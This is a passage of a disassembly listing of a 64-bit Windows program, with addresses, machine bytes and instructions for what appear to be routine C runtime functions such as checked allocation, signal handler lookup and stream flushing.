   140009c61:	cc                   	int3
   140009c62:	cc                   	int3
   140009c63:	cc                   	int3
   140009c64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009c69:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009c6e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140009c73:	57                   	push   %rdi
   140009c74:	48 83 ec 20          	sub    $0x20,%rsp
   140009c78:	49 8b e8             	mov    %r8,%rbp
   140009c7b:	48 8b da             	mov    %rdx,%rbx
   140009c7e:	48 8b f1             	mov    %rcx,%rsi
   140009c81:	48 85 d2             	test   %rdx,%rdx
   140009c84:	74 1d                	je     0x140009ca3
   140009c86:	33 d2                	xor    %edx,%edx
   140009c88:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   140009c8c:	48 f7 f3             	div    %rbx
   140009c8f:	49 3b c0             	cmp    %r8,%rax
   140009c92:	73 0f                	jae    0x140009ca3
   140009c94:	e8 bb d7 ff ff       	call   0x140007454
   140009c99:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140009c9f:	33 c0                	xor    %eax,%eax
   140009ca1:	eb 41                	jmp    0x140009ce4
   140009ca3:	48 85 f6             	test   %rsi,%rsi
   140009ca6:	74 0a                	je     0x140009cb2
   140009ca8:	e8 07 15 00 00       	call   0x14000b1b4
   140009cad:	48 8b f8             	mov    %rax,%rdi
   140009cb0:	eb 02                	jmp    0x140009cb4
   140009cb2:	33 ff                	xor    %edi,%edi
   140009cb4:	48 0f af dd          	imul   %rbp,%rbx
   140009cb8:	48 8b ce             	mov    %rsi,%rcx
   140009cbb:	48 8b d3             	mov    %rbx,%rdx
   140009cbe:	e8 2d 15 00 00       	call   0x14000b1f0
   140009cc3:	48 8b f0             	mov    %rax,%rsi
   140009cc6:	48 85 c0             	test   %rax,%rax
   140009cc9:	74 16                	je     0x140009ce1
   140009ccb:	48 3b fb             	cmp    %rbx,%rdi
   140009cce:	73 11                	jae    0x140009ce1
   140009cd0:	48 2b df             	sub    %rdi,%rbx
   140009cd3:	48 8d 0c 38          	lea    (%rax,%rdi,1),%rcx
   140009cd7:	4c 8b c3             	mov    %rbx,%r8
   140009cda:	33 d2                	xor    %edx,%edx
   140009cdc:	e8 0f 41 00 00       	call   0x14000ddf0
   140009ce1:	48 8b c6             	mov    %rsi,%rax
   140009ce4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009ce9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009cee:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009cf3:	48 83 c4 20          	add    $0x20,%rsp
   140009cf7:	5f                   	pop    %rdi
   140009cf8:	c3                   	ret
   140009cf9:	cc                   	int3
   140009cfa:	cc                   	int3
   140009cfb:	cc                   	int3
   140009cfc:	48 83 ec 28          	sub    $0x28,%rsp
   140009d00:	ff 15 f2 54 00 00    	call   *0x54f2(%rip)        # 0x14000f1f8
   140009d06:	48 85 c0             	test   %rax,%rax
   140009d09:	48 89 05 78 0a 01 00 	mov    %rax,0x10a78(%rip)        # 0x14001a788
   140009d10:	0f 95 c0             	setne  %al
   140009d13:	48 83 c4 28          	add    $0x28,%rsp
   140009d17:	c3                   	ret
   140009d18:	48 83 25 68 0a 01 00 	andq   $0x0,0x10a68(%rip)        # 0x14001a788
   140009d1f:	00 
   140009d20:	b0 01                	mov    $0x1,%al
   140009d22:	c3                   	ret
   140009d23:	cc                   	int3
   140009d24:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009d29:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009d2e:	57                   	push   %rdi
   140009d2f:	48 83 ec 20          	sub    $0x20,%rsp
   140009d33:	48 8b f2             	mov    %rdx,%rsi
   140009d36:	48 8b f9             	mov    %rcx,%rdi
   140009d39:	48 3b ca             	cmp    %rdx,%rcx
   140009d3c:	74 68                	je     0x140009da6
   140009d3e:	48 8b d9             	mov    %rcx,%rbx
   140009d41:	48 8b 03             	mov    (%rbx),%rax
   140009d44:	48 85 c0             	test   %rax,%rax
   140009d47:	74 14                	je     0x140009d5d
   140009d49:	49 ba 70 a2 5c 5c c4 	movabs $0xdf949ec45c5ca270,%r10
   140009d50:	9e 94 df 
   140009d53:	ff 15 0f 55 00 00    	call   *0x550f(%rip)        # 0x14000f268
   140009d59:	84 c0                	test   %al,%al
   140009d5b:	74 09                	je     0x140009d66
   140009d5d:	48 83 c3 10          	add    $0x10,%rbx
   140009d61:	48 3b de             	cmp    %rsi,%rbx
   140009d64:	75 db                	jne    0x140009d41
   140009d66:	48 3b de             	cmp    %rsi,%rbx
   140009d69:	74 3b                	je     0x140009da6
   140009d6b:	48 3b df             	cmp    %rdi,%rbx
   140009d6e:	74 32                	je     0x140009da2
   140009d70:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   140009d74:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   140009d79:	74 1a                	je     0x140009d95
   140009d7b:	48 8b 03             	mov    (%rbx),%rax
   140009d7e:	48 85 c0             	test   %rax,%rax
   140009d81:	74 12                	je     0x140009d95
   140009d83:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   140009d8a:	a6 99 97 
   140009d8d:	33 c9                	xor    %ecx,%ecx
   140009d8f:	ff 15 d3 54 00 00    	call   *0x54d3(%rip)        # 0x14000f268
   140009d95:	48 83 eb 10          	sub    $0x10,%rbx
   140009d99:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140009d9d:	48 3b c7             	cmp    %rdi,%rax
   140009da0:	75 d2                	jne    0x140009d74
   140009da2:	32 c0                	xor    %al,%al
   140009da4:	eb 02                	jmp    0x140009da8
   140009da6:	b0 01                	mov    $0x1,%al
   140009da8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009dad:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009db2:	48 83 c4 20          	add    $0x20,%rsp
   140009db6:	5f                   	pop    %rdi
   140009db7:	c3                   	ret
   140009db8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009dbd:	57                   	push   %rdi
   140009dbe:	48 83 ec 20          	sub    $0x20,%rsp
   140009dc2:	48 8b da             	mov    %rdx,%rbx
   140009dc5:	48 8b f9             	mov    %rcx,%rdi
   140009dc8:	48 3b ca             	cmp    %rdx,%rcx
   140009dcb:	74 24                	je     0x140009df1
   140009dcd:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140009dd1:	48 85 c0             	test   %rax,%rax
   140009dd4:	74 12                	je     0x140009de8
   140009dd6:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   140009ddd:	a6 99 97 
   140009de0:	33 c9                	xor    %ecx,%ecx
   140009de2:	ff 15 80 54 00 00    	call   *0x5480(%rip)        # 0x14000f268
   140009de8:	48 83 eb 10          	sub    $0x10,%rbx
   140009dec:	48 3b df             	cmp    %rdi,%rbx
   140009def:	75 dc                	jne    0x140009dcd
   140009df1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009df6:	b0 01                	mov    $0x1,%al
   140009df8:	48 83 c4 20          	add    $0x20,%rsp
   140009dfc:	5f                   	pop    %rdi
   140009dfd:	c3                   	ret
   140009dfe:	cc                   	int3
   140009dff:	cc                   	int3
   140009e00:	48 89 0d 89 09 01 00 	mov    %rcx,0x10989(%rip)        # 0x14001a790
   140009e07:	c3                   	ret
   140009e08:	40 53                	rex push %rbx
   140009e0a:	48 83 ec 20          	sub    $0x20,%rsp
   140009e0e:	48 8b d9             	mov    %rcx,%rbx
   140009e11:	e8 2e 00 00 00       	call   0x140009e44
   140009e16:	48 85 c0             	test   %rax,%rax
   140009e19:	74 1e                	je     0x140009e39
   140009e1b:	49 ba 70 20 d3 1c df 	movabs $0xd1ed0fdf1cd32070,%r10
   140009e22:	0f ed d1 
   140009e25:	48 8b cb             	mov    %rbx,%rcx
   140009e28:	ff 15 3a 54 00 00    	call   *0x543a(%rip)        # 0x14000f268
   140009e2e:	85 c0                	test   %eax,%eax
   140009e30:	74 07                	je     0x140009e39
   140009e32:	b8 01 00 00 00       	mov    $0x1,%eax
   140009e37:	eb 02                	jmp    0x140009e3b
   140009e39:	33 c0                	xor    %eax,%eax
   140009e3b:	48 83 c4 20          	add    $0x20,%rsp
   140009e3f:	5b                   	pop    %rbx
   140009e40:	c3                   	ret
   140009e41:	cc                   	int3
   140009e42:	cc                   	int3
   140009e43:	cc                   	int3
   140009e44:	40 53                	rex push %rbx
   140009e46:	48 83 ec 20          	sub    $0x20,%rsp
   140009e4a:	33 c9                	xor    %ecx,%ecx
   140009e4c:	e8 57 ea ff ff       	call   0x1400088a8
   140009e51:	90                   	nop
   140009e52:	48 8b 1d e7 f1 00 00 	mov    0xf1e7(%rip),%rbx        # 0x140019040
   140009e59:	8b cb                	mov    %ebx,%ecx
   140009e5b:	83 e1 3f             	and    $0x3f,%ecx
   140009e5e:	48 33 1d 2b 09 01 00 	xor    0x1092b(%rip),%rbx        # 0x14001a790
   140009e65:	48 d3 cb             	ror    %cl,%rbx
   140009e68:	33 c9                	xor    %ecx,%ecx
   140009e6a:	e8 8d ea ff ff       	call   0x1400088fc
   140009e6f:	48 8b c3             	mov    %rbx,%rax
   140009e72:	48 83 c4 20          	add    $0x20,%rsp
   140009e76:	5b                   	pop    %rbx
   140009e77:	c3                   	ret
   140009e78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e7d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140009e82:	57                   	push   %rdi
   140009e83:	48 83 ec 20          	sub    $0x20,%rsp
   140009e87:	49 8b f9             	mov    %r9,%rdi
   140009e8a:	8b 0a                	mov    (%rdx),%ecx
   140009e8c:	e8 17 ea ff ff       	call   0x1400088a8
   140009e91:	90                   	nop
   140009e92:	48 8b 1d a7 f1 00 00 	mov    0xf1a7(%rip),%rbx        # 0x140019040
   140009e99:	8b cb                	mov    %ebx,%ecx
   140009e9b:	83 e1 3f             	and    $0x3f,%ecx
   140009e9e:	48 33 1d 03 09 01 00 	xor    0x10903(%rip),%rbx        # 0x14001a7a8
   140009ea5:	48 d3 cb             	ror    %cl,%rbx
   140009ea8:	8b 0f                	mov    (%rdi),%ecx
   140009eaa:	e8 4d ea ff ff       	call   0x1400088fc
   140009eaf:	48 8b c3             	mov    %rbx,%rax
   140009eb2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009eb7:	48 83 c4 20          	add    $0x20,%rsp
   140009ebb:	5f                   	pop    %rdi
   140009ebc:	c3                   	ret
   140009ebd:	cc                   	int3
   140009ebe:	cc                   	int3
   140009ebf:	cc                   	int3
   140009ec0:	4c 8b dc             	mov    %rsp,%r11
   140009ec3:	48 83 ec 28          	sub    $0x28,%rsp
   140009ec7:	b8 03 00 00 00       	mov    $0x3,%eax
   140009ecc:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140009ed0:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140009ed4:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140009ed8:	49 8d 53 18          	lea    0x18(%r11),%rdx
   140009edc:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140009ee0:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140009ee4:	e8 8f ff ff ff       	call   0x140009e78
   140009ee9:	48 83 c4 28          	add    $0x28,%rsp
   140009eed:	c3                   	ret
   140009eee:	cc                   	int3
   140009eef:	cc                   	int3
   140009ef0:	48 89 0d a1 08 01 00 	mov    %rcx,0x108a1(%rip)        # 0x14001a798
   140009ef7:	48 89 0d a2 08 01 00 	mov    %rcx,0x108a2(%rip)        # 0x14001a7a0
   140009efe:	48 89 0d a3 08 01 00 	mov    %rcx,0x108a3(%rip)        # 0x14001a7a8
   140009f05:	48 89 0d a4 08 01 00 	mov    %rcx,0x108a4(%rip)        # 0x14001a7b0
   140009f0c:	c3                   	ret
   140009f0d:	cc                   	int3
   140009f0e:	cc                   	int3
   140009f0f:	cc                   	int3
   140009f10:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009f15:	56                   	push   %rsi
   140009f16:	57                   	push   %rdi
   140009f17:	41 54                	push   %r12
   140009f19:	41 55                	push   %r13
   140009f1b:	41 56                	push   %r14
   140009f1d:	48 83 ec 40          	sub    $0x40,%rsp
   140009f21:	8b d9                	mov    %ecx,%ebx
   140009f23:	45 33 ed             	xor    %r13d,%r13d
   140009f26:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   140009f2b:	41 b6 01             	mov    $0x1,%r14b
   140009f2e:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140009f33:	83 f9 02             	cmp    $0x2,%ecx
   140009f36:	74 21                	je     0x140009f59
   140009f38:	83 f9 04             	cmp    $0x4,%ecx
   140009f3b:	74 4c                	je     0x140009f89
   140009f3d:	83 f9 06             	cmp    $0x6,%ecx
   140009f40:	74 17                	je     0x140009f59
   140009f42:	83 f9 08             	cmp    $0x8,%ecx
   140009f45:	74 42                	je     0x140009f89
   140009f47:	83 f9 0b             	cmp    $0xb,%ecx
   140009f4a:	74 3d                	je     0x140009f89
   140009f4c:	83 f9 0f             	cmp    $0xf,%ecx
   140009f4f:	74 08                	je     0x140009f59
   140009f51:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140009f54:	83 f8 01             	cmp    $0x1,%eax
   140009f57:	77 7d                	ja     0x140009fd6
   140009f59:	83 e9 02             	sub    $0x2,%ecx
   140009f5c:	0f 84 af 00 00 00    	je     0x14000a011
   140009f62:	83 e9 04             	sub    $0x4,%ecx
   140009f65:	0f 84 8b 00 00 00    	je     0x140009ff6
   140009f6b:	83 e9 09             	sub    $0x9,%ecx
   140009f6e:	0f 84 94 00 00 00    	je     0x14000a008
   140009f74:	83 e9 06             	sub    $0x6,%ecx
   140009f77:	0f 84 82 00 00 00    	je     0x140009fff
   140009f7d:	83 f9 01             	cmp    $0x1,%ecx
   140009f80:	74 74                	je     0x140009ff6
   140009f82:	33 ff                	xor    %edi,%edi
   140009f84:	e9 8f 00 00 00       	jmp    0x14000a018
   140009f89:	e8 fe cc ff ff       	call   0x140006c8c
   140009f8e:	4c 8b e8             	mov    %rax,%r13
   140009f91:	48 85 c0             	test   %rax,%rax
   140009f94:	75 18                	jne    0x140009fae
   140009f96:	83 c8 ff             	or     $0xffffffff,%eax
   140009f99:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140009fa0:	00 
   140009fa1:	48 83 c4 40          	add    $0x40,%rsp
   140009fa5:	41 5e                	pop    %r14
   140009fa7:	41 5d                	pop    %r13
   140009fa9:	41 5c                	pop    %r12
   140009fab:	5f                   	pop    %rdi
   140009fac:	5e                   	pop    %rsi
   140009fad:	c3                   	ret
   140009fae:	48 8b 00             	mov    (%rax),%rax
   140009fb1:	48 8b 0d 78 64 00 00 	mov    0x6478(%rip),%rcx        # 0x140010430
   140009fb8:	48 c1 e1 04          	shl    $0x4,%rcx
   140009fbc:	48 03 c8             	add    %rax,%rcx
   140009fbf:	eb 09                	jmp    0x140009fca
   140009fc1:	39 58 04             	cmp    %ebx,0x4(%rax)
   140009fc4:	74 0b                	je     0x140009fd1
   140009fc6:	48 83 c0 10          	add    $0x10,%rax
   140009fca:	48 3b c1             	cmp    %rcx,%rax
   140009fcd:	75 f2                	jne    0x140009fc1
   140009fcf:	33 c0                	xor    %eax,%eax
   140009fd1:	48 85 c0             	test   %rax,%rax
   140009fd4:	75 12                	jne    0x140009fe8
   140009fd6:	e8 79 d4 ff ff       	call   0x140007454
   140009fdb:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009fe1:	e8 16 d2 ff ff       	call   0x1400071fc
   140009fe6:	eb ae                	jmp    0x140009f96
   140009fe8:	48 8d 78 08          	lea    0x8(%rax),%rdi
   140009fec:	45 32 f6             	xor    %r14b,%r14b
   140009fef:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140009ff4:	eb 22                	jmp    0x14000a018
   140009ff6:	48 8d 3d ab 07 01 00 	lea    0x107ab(%rip),%rdi        # 0x14001a7a8
   140009ffd:	eb 19                	jmp    0x14000a018
   140009fff:	48 8d 3d 9a 07 01 00 	lea    0x1079a(%rip),%rdi        # 0x14001a7a0
   14000a006:	eb 10                	jmp    0x14000a018
   14000a008:	48 8d 3d a1 07 01 00 	lea    0x107a1(%rip),%rdi        # 0x14001a7b0
   14000a00f:	eb 07                	jmp    0x14000a018
   14000a011:	48 8d 3d 80 07 01 00 	lea    0x10780(%rip),%rdi        # 0x14001a798
   14000a018:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   14000a01f:	00 00 
   14000a021:	45 84 f6             	test   %r14b,%r14b
   14000a024:	74 0b                	je     0x14000a031
   14000a026:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000a02b:	e8 78 e8 ff ff       	call   0x1400088a8
   14000a030:	90                   	nop
   14000a031:	48 8b 37             	mov    (%rdi),%rsi
   14000a034:	45 84 f6             	test   %r14b,%r14b
   14000a037:	74 12                	je     0x14000a04b
   14000a039:	48 8b 05 00 f0 00 00 	mov    0xf000(%rip),%rax        # 0x140019040
   14000a040:	8b c8                	mov    %eax,%ecx
   14000a042:	83 e1 3f             	and    $0x3f,%ecx
   14000a045:	48 33 f0             	xor    %rax,%rsi
   14000a048:	48 d3 ce             	ror    %cl,%rsi
   14000a04b:	48 83 fe 01          	cmp    $0x1,%rsi
   14000a04f:	0f 84 94 00 00 00    	je     0x14000a0e9
   14000a055:	48 85 f6             	test   %rsi,%rsi
   14000a058:	0f 84 17 01 00 00    	je     0x14000a175
   14000a05e:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000a064:	83 fb 0b             	cmp    $0xb,%ebx
   14000a067:	77 3d                	ja     0x14000a0a6
   14000a069:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a06d:	73 37                	jae    0x14000a0a6
   14000a06f:	49 8b 45 08          	mov    0x8(%r13),%rax
   14000a073:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   14000a07a:	00 
   14000a07b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a080:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   14000a085:	83 fb 08             	cmp    $0x8,%ebx
   14000a088:	75 53                	jne    0x14000a0dd
   14000a08a:	e8 85 ca ff ff       	call   0x140006b14
   14000a08f:	8b 40 10             	mov    0x10(%rax),%eax
   14000a092:	89 44 24 78          	mov    %eax,0x78(%rsp)
   14000a096:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000a09a:	e8 75 ca ff ff       	call   0x140006b14
   14000a09f:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   14000a0a6:	83 fb 08             	cmp    $0x8,%ebx
   14000a0a9:	75 32                	jne    0x14000a0dd
   14000a0ab:	48 8b 05 86 63 00 00 	mov    0x6386(%rip),%rax        # 0x140010438
   14000a0b2:	48 c1 e0 04          	shl    $0x4,%rax
   14000a0b6:	49 03 45 00          	add    0x0(%r13),%rax
   14000a0ba:	48 8b 0d 7f 63 00 00 	mov    0x637f(%rip),%rcx        # 0x140010440
   14000a0c1:	48 c1 e1 04          	shl    $0x4,%rcx
   14000a0c5:	48 03 c8             	add    %rax,%rcx
   14000a0c8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a0cd:	48 3b c1             	cmp    %rcx,%rax
   14000a0d0:	74 1d                	je     0x14000a0ef
   14000a0d2:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   14000a0d7:	48 83 c0 10          	add    $0x10,%rax
   14000a0db:	eb eb                	jmp    0x14000a0c8
   14000a0dd:	48 8b 05 5c ef 00 00 	mov    0xef5c(%rip),%rax        # 0x140019040
   14000a0e4:	48 89 07             	mov    %rax,(%rdi)
   14000a0e7:	eb 06                	jmp    0x14000a0ef
   14000a0e9:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000a0ef:	45 84 f6             	test   %r14b,%r14b
   14000a0f2:	74 0a                	je     0x14000a0fe
   14000a0f4:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000a0f9:	e8 fe e7 ff ff       	call   0x1400088fc
   14000a0fe:	48 83 fe 01          	cmp    $0x1,%rsi
   14000a102:	75 07                	jne    0x14000a10b
   14000a104:	33 c0                	xor    %eax,%eax
   14000a106:	e9 8e fe ff ff       	jmp    0x140009f99
   14000a10b:	83 fb 08             	cmp    $0x8,%ebx
   14000a10e:	75 23                	jne    0x14000a133
   14000a110:	e8 ff c9 ff ff       	call   0x140006b14
   14000a115:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   14000a11c:	1f 9c 8b 
   14000a11f:	8b 50 10             	mov    0x10(%rax),%edx
   14000a122:	8b cb                	mov    %ebx,%ecx
   14000a124:	48 8b c6             	mov    %rsi,%rax
   14000a127:	4c 8b 05 3a 51 00 00 	mov    0x513a(%rip),%r8        # 0x14000f268
   14000a12e:	41 ff d0             	call   *%r8
   14000a131:	eb 18                	jmp    0x14000a14b
   14000a133:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   14000a13a:	86 c1 c6 
   14000a13d:	8b cb                	mov    %ebx,%ecx
   14000a13f:	48 8b c6             	mov    %rsi,%rax
   14000a142:	48 8b 15 1f 51 00 00 	mov    0x511f(%rip),%rdx        # 0x14000f268
   14000a149:	ff d2                	call   *%rdx
   14000a14b:	83 fb 0b             	cmp    $0xb,%ebx
   14000a14e:	77 b4                	ja     0x14000a104
   14000a150:	41 0f a3 dc          	bt     %ebx,%r12d
   14000a154:	73 ae                	jae    0x14000a104
   14000a156:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000a15d:	00 
   14000a15e:	49 89 45 08          	mov    %rax,0x8(%r13)
   14000a162:	83 fb 08             	cmp    $0x8,%ebx
   14000a165:	75 9d                	jne    0x14000a104
   14000a167:	e8 a8 c9 ff ff       	call   0x140006b14
   14000a16c:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   14000a170:	89 48 10             	mov    %ecx,0x10(%rax)
   14000a173:	eb 8f                	jmp    0x14000a104
   14000a175:	45 84 f6             	test   %r14b,%r14b
   14000a178:	74 08                	je     0x14000a182
   14000a17a:	8d 4e 03             	lea    0x3(%rsi),%ecx
   14000a17d:	e8 7a e7 ff ff       	call   0x1400088fc
   14000a182:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000a187:	e8 e4 bb ff ff       	call   0x140005d70
   14000a18c:	90                   	nop
   14000a18d:	cc                   	int3
   14000a18e:	cc                   	int3
   14000a18f:	cc                   	int3
   14000a190:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a195:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a19a:	57                   	push   %rdi
   14000a19b:	48 83 ec 20          	sub    $0x20,%rsp
   14000a19f:	49 8b f9             	mov    %r9,%rdi
   14000a1a2:	49 8b d8             	mov    %r8,%rbx
   14000a1a5:	48 8b 0a             	mov    (%rdx),%rcx
   14000a1a8:	e8 a3 04 00 00       	call   0x14000a650
   14000a1ad:	90                   	nop
   14000a1ae:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000a1b2:	48 8b 03             	mov    (%rbx),%rax
   14000a1b5:	48 8b 08             	mov    (%rax),%rcx
   14000a1b8:	48 85 c9             	test   %rcx,%rcx
   14000a1bb:	74 5a                	je     0x14000a217
   14000a1bd:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000a1c0:	8b c1                	mov    %ecx,%eax
   14000a1c2:	c1 e8 0d             	shr    $0xd,%eax
   14000a1c5:	24 01                	and    $0x1,%al
   14000a1c7:	74 4e                	je     0x14000a217
   14000a1c9:	8b c1                	mov    %ecx,%eax
   14000a1cb:	24 03                	and    $0x3,%al
   14000a1cd:	3c 02                	cmp    $0x2,%al
   14000a1cf:	75 05                	jne    0x14000a1d6
   14000a1d1:	f6 c1 c0             	test   $0xc0,%cl
   14000a1d4:	75 0a                	jne    0x14000a1e0
   14000a1d6:	0f ba e1 0b          	bt     $0xb,%ecx
   14000a1da:	72 04                	jb     0x14000a1e0
   14000a1dc:	ff 02                	incl   (%rdx)
   14000a1de:	eb 37                	jmp    0x14000a217
   14000a1e0:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000a1e4:	80 38 00             	cmpb   $0x0,(%rax)
   14000a1e7:	75 0f                	jne    0x14000a1f8
   14000a1e9:	48 8b 03             	mov    (%rbx),%rax
   14000a1ec:	48 8b 08             	mov    (%rax),%rcx
   14000a1ef:	8b 41 14             	mov    0x14(%rcx),%eax
   14000a1f2:	d1 e8                	shr    $1,%eax
   14000a1f4:	24 01                	and    $0x1,%al
   14000a1f6:	74 1f                	je     0x14000a217
   14000a1f8:	48 8b 0b             	mov    (%rbx),%rcx
   14000a1fb:	48 8b 09             	mov    (%rcx),%rcx
   14000a1fe:	e8 f5 01 00 00       	call   0x14000a3f8
   14000a203:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000a206:	74 08                	je     0x14000a210
   14000a208:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000a20c:	ff 00                	incl   (%rax)
   14000a20e:	eb 07                	jmp    0x14000a217
   14000a210:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000a214:	83 08 ff             	orl    $0xffffffff,(%rax)
   14000a217:	48 8b 0f             	mov    (%rdi),%rcx
   14000a21a:	e8 3d 04 00 00       	call   0x14000a65c
   14000a21f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a224:	48 83 c4 20          	add    $0x20,%rsp
   14000a228:	5f                   	pop    %rdi
   14000a229:	c3                   	ret
   14000a22a:	cc                   	int3
   14000a22b:	cc                   	int3
   14000a22c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a231:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000a236:	56                   	push   %rsi
   14000a237:	57                   	push   %rdi
   14000a238:	41 56                	push   %r14
   14000a23a:	48 83 ec 60          	sub    $0x60,%rsp
   14000a23e:	49 8b f9             	mov    %r9,%rdi
   14000a241:	49 8b f0             	mov    %r8,%rsi
   14000a244:	8b 0a                	mov    (%rdx),%ecx
   14000a246:	e8 5d e6 ff ff       	call   0x1400088a8
   14000a24b:	90                   	nop
   14000a24c:	48 8b 1d 6d 05 01 00 	mov    0x1056d(%rip),%rbx        # 0x14001a7c0
   14000a253:	48 63 05 5e 05 01 00 	movslq 0x1055e(%rip),%rax        # 0x14001a7b8
   14000a25a:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000a25e:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   14000a263:	49 3b de             	cmp    %r14,%rbx
   14000a266:	0f 84 88 00 00 00    	je     0x14000a2f4
   14000a26c:	48 8b 03             	mov    (%rbx),%rax
   14000a26f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000a274:	48 8b 16             	mov    (%rsi),%rdx
   14000a277:	48 85 c0             	test   %rax,%rax
   14000a27a:	74 21                	je     0x14000a29d
   14000a27c:	8b 48 14             	mov    0x14(%rax),%ecx
   14000a27f:	8b c1                	mov    %ecx,%eax
   14000a281:	c1 e8 0d             	shr    $0xd,%eax
   14000a284:	24 01                	and    $0x1,%al
   14000a286:	74 15                	je     0x14000a29d
   14000a288:	8b c1                	mov    %ecx,%eax
   14000a28a:	24 03                	and    $0x3,%al
   14000a28c:	3c 02                	cmp    $0x2,%al
   14000a28e:	75 05                	jne    0x14000a295
   14000a290:	f6 c1 c0             	test   $0xc0,%cl
   14000a293:	75 0e                	jne    0x14000a2a3
   14000a295:	0f ba e1 0b          	bt     $0xb,%ecx
   14000a299:	72 08                	jb     0x14000a2a3
   14000a29b:	ff 02                	incl   (%rdx)
   14000a29d:	48 83 c3 08          	add    $0x8,%rbx
   14000a2a1:	eb bb                	jmp    0x14000a25e
   14000a2a3:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   14000a2a7:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000a2ab:	48 8b 06             	mov    (%rsi),%rax
   14000a2ae:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   14000a2b3:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   14000a2b8:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000a2bd:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   14000a2c2:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   14000a2c7:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000a2cc:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000a2d1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a2d6:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000a2db:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   14000a2e0:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000a2e5:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000a2ec:	00 
   14000a2ed:	e8 9e fe ff ff       	call   0x14000a190
   14000a2f2:	eb a9                	jmp    0x14000a29d
   14000a2f4:	8b 0f                	mov    (%rdi),%ecx
   14000a2f6:	e8 01 e6 ff ff       	call   0x1400088fc
   14000a2fb:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   14000a302:	00 
   14000a303:	48 83 c4 60          	add    $0x60,%rsp
   14000a307:	41 5e                	pop    %r14
   14000a309:	5f                   	pop    %rdi
   14000a30a:	5e                   	pop    %rsi
   14000a30b:	c3                   	ret
   14000a30c:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   14000a310:	55                   	push   %rbp
